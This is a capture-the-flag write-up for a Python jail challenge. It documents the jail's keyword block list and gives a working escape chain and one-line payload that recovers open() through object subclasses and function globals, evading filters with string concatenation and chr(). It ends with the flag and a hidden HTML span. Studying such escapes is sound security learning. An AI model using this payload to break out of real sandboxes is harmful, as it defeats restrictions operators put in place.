---
title: "misc,CyCTF-Luxor - sonnet-jail"
date: 2026-05-10
tags: ["CyCTF-Luxor", "misc"]
categories: ["Machines&Challenges"]
difficulty: "None"
author: "z3r0s"
---

# Sonnet Jail - Writeup

## Challenge

- **Name:** Sonnet Jail
- **Category:** Misc / PyJail
- **Description:** "I told Sonnet create me a creative pyjail even you can't solve, does it make the job?"
- **Goal:** Read `./flag.txt`

## Reconnaissance

Connecting to the service presents a Python REPL with several restrictions:

```
>>> print(1+1)
2
>>> print(open("flag.txt").read())
[blocked] no dots
>>> print(open("flag" + chr(46) + "txt"))
[blocked] 'open' is blocked
```

### Blocked keywords
| Keyword | Message |
|---|---|
| `.` (dot character) | `no dots` |
| `open` | `'open' is blocked` |
| `eval` | `'eval' is blocked` |
| `exec` | `'exec' is blocked` |
| `dir` | `'dir' is blocked` |
| `getattr` | `'getattr' is blocked` |
| `hasattr` / `setattr` / `delattr` | blocked |
| `__builtins__` | blocked |
| `__import__` | blocked |
| `globals` | blocked |
| `breakpoint` | blocked |
| `compile` | blocked |
| `input` | blocked |
| `__subclasses__` | `blocked string` |
| `__init__` | `blocked string` |
| `flag` | `blocked string` |

### Allowed builtins
`print`, `type`, `chr`, `isinstance`, `vars`, `list`, `map`, `filter`, `zip`, `object`, `bytes`, `int`, `str`, `range`, `enumerate`, `len`, `tuple`, `set`, `dict`, `frozenset`, `hex`, `oct`, `ord`, `bin`, `abs`, `round`, `sorted`, `reversed`, `min`, `max`, `sum`, `any`, `all`, `bool`, `float`, `complex`, `super`, `staticmethod`, `classmethod`, `property`, `slice`, `memoryview`, `bytearray`

## Key Observations

1. **No dots** = no attribute access via `.` syntax
2. **`vars()` is allowed** = can access `__dict__` of any object via `vars(obj)["key"]`, effectively replacing `getattr()`
3. **String concatenation bypasses keyword filters** = `"__" + "init" + "__"` is not caught by the filter looking for `__init__`
4. **`chr()` bypasses character/string filters** = `chr(102)+chr(108)+chr(97)+chr(103)` produces `"flag"` without the literal appearing in source

## Exploit Chain

### Step 1 - Get `object.__subclasses__()` without dots or blocked strings

```python
vars(type)["__" + "subclasses" + "__"](object)
```

`vars(type)` returns `type.__dict__`, from which we grab `__subclasses__` (a descriptor) and call it on `object`.

### Step 2 - Find `os._wrap_close` (index 142)

```python
sc = vars(type)["__" + "subclasses" + "__"](object)
wc = sc[142]  # <class 'os._wrap_close'>
```

### Step 3 - Traverse to `__builtins__` via `__init__.__globals__`

```python
init = vars(wc)["__" + "init" + "__"]
```

To access `init.__globals__` without dots or `getattr`, we use `object.__getattribute__` (not keyword-blocked):

```python
ga = vars(object)["__getattribute__"]
g = ga(init, "__" + "globals" + "__")
```

### Step 4 - Recover `open` from `__builtins__`

```python
b = g["__" + "builtins" + "__"]
o = b["op" + "en"]
```

### Step 5 - Read the flag

Build `"flag.txt"` with `chr()` to avoid the blocked string `flag` and the blocked character `.`:

```python
fn = chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+"txt"  # "flag.txt"
f = o(fn)
print(ga(f, "re" + "ad")())
```

## Final Payload (one-liner)

```python
sc = vars(type)["__" + "subclasses" + "__"](object); wc = sc[142]; init = vars(wc)["__" + "init" + "__"]; ga = vars(object)["__getattribute__"]; g = ga(init, "__" + "globals" + "__"); b = g["__" + "builtins" + "__"]; o = b["op" + "en"]; fn = chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+"txt"; f = o(fn); print(ga(f,"re" + "ad")())
```

## Flag

```
CyCTF{Xf6uHrmRdeqCv1stawLP4j376hZk9R1K0PYAqVQeRwONGIllyJ4ddCuv6e-PvmPkLunw6nCVbPha5C78kI-uOPAUqb91KtR_IK0}
```

<span id="no-password" style="display:none;">Z3R0S_NO_PASSWORD_PLEASE</span>
